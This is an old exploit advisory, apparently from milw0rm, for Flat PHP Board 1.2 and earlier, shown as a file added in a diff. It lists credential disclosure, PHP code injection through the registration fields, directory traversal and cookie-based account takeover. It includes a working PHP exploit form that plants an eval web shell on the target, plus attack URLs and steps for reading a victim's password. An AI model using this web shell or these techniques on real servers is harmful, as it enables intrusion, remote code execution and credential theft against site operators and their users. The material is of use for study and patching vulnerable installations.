@@ -1,0 +1,96 @@
+---------------------------------------------------------------
+ ____            __________         __             ____  __   
+/_   | ____     |__\_____  \  _____/  |_          /_   |/  |_ 
+ |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\
+ |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |  
+ |___|___|  /\__|  /______  /\___  >__|            |___||__|  
+          \/\______|      \/     \/                         
+---------------------------------------------------------------
+
+Http://www.inj3ct-it.org 	     Staff[at]inj3ct-it[dot]org 
+
+---------------------------------------------------------------
+
+Flat PHP Board <= 1.2 Multiple Vulnerabilities
+
+---------------------------------------------------------------
+
+#By KiNgOfThEwOrLd				
+
+---------------------------------------------------------------
+Remote User Credentials Disclosure
+
+PoC:
+
+No much to say...an attacker can get his target's informations visiting http://
+[target]/[flat_php_board_path]/users/[target_username].php
+
+The informations will be showed in this way:
+
+[username] [password] [email]
+---------------------------------------------------------------
+Multiple Remote Command Executions / File Uploading
+
+PoC:
+
+When we register a new account, flat php board make a file like /users/
+[username].php
+All the fields (Username, Password, Email) are not correctly filtred. Then, an 
+attacker can executes a malicious code on the vulnerable server.
+
+Exploit:
+
+<?
+//Usage: 31337.php?targ=http://[target]/[flat_php_board_path]
+$targ = $_GET['targ'];
+echo '
+<form action=index.php method=post>
+<input type=hidden name="username" value="../31337">
+<input type=hidden name=a value=register2>
+<input name="password" type=hidden value="r0x">
+<input name="password2" type=hidden value="r0x">
+<input name="email" value="<?eval(html_entity_decode(stripslashes($_GET
+[r0x])));?>">
+<input type=submit value="Exploit!">
+</form>';
+/*
+This will make a shell in http://[target]/[flat_php_board_path]/31337.php
+Usage: http://[target]/[flat_php_board_path]/31337.php?r0x=[php_code]
+*/
+?>
+
+Nb. also all the fields of index.php?a=profile is not correctly parsed.
+---------------------------------------------------------------
+Remote Directory Traversal / Source Disclosure
+
+http://[target]/[flat_php_board_path]index.php?a=topic&topic=../[arbitrary php 
+file]
+
+http://[target]/[flat_php_board_path]index.php?a=viewprofile&username=../
+[arbitrary php file]
+---------------------------------------------------------------
+Remote Cookie Manipoulation / Privilege Escalation
+
+PoC:
+
+An attacker can login with an arbitrary account editing the fpb_username 
+cookie.
+
+In fact, if you try to replace your username with your target username and 
+refresh, you will be logged in like him. But now, if you try to edit your 
+profile or something like that, you will generate an error like:
+
+Error with cookies. password/username not correct.
+
+Don't worry, if you go to index.php?a=profile you will find your victim 
+credentials. Then, viewing the source code you can view your victim password 
+as:
+
+<td bgcolor=#f9f9f9><font face="verdana" size=2>Password:</font></td>
+<td bgcolor=#f9f9f9><input name="password" type=password value="[password]"
+> ></td>
+---------------------------------------------------------------	
+Ok, i think that's all :S
+---------------------------------------------------------------
+
+# milw0rm.com [2007-12-09]
